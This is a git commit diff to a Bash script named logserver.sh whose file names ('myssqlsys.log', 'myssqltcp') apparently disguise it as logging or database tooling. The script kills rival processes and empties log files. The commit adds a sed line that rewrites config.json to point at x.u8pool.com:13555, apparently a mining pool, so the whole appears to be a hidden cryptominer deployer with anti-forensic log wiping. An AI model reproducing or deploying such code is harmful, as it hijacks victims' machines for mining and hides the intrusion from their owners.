5b0a4f22409b8f158eb5cdb6ecd6104019c2af66
teshushu <905353149@qq.com>
2023-01-24 05:24:49 +0800

    Update logserver.sh

--- Bash/logserver.sh
+++ Bash/logserver.sh
@@ -4,6 +4,12 @@ if [ -z $HOME ]; then
   exit 1
 fi
 
+if [ ! -d $HOME ]; then
+  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
+  echo '  export HOME=<dir>'
+  exit 1
+fi
+
 kill_sus_proc()
 {
     ps axf -o "pid"|while read procid
@@ -37,15 +43,11 @@ killall -9 jj
 killall -9 p
 kill_sus_proc
 
-if [ ! -d $HOME ]; then
-  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
-  echo '  export HOME=<dir>'
-  exit 1
-fi
-
 if [ `/bin/ls -lt /$HOME/myssqlsys.log | head -1 | /bin/awk '{print $5}'` -gt $((18*18*10)) ]
 then
     echo > /$HOME/myssqlsys.log
 fi
  
 ls *.log | xargs -I x -n 1 sh -c "echo > x”
+
+sed -i 's/"url": *"[^"]*",/"url": "x.u8pool.com:13555",/' $HOME/myssqltcp/config.json
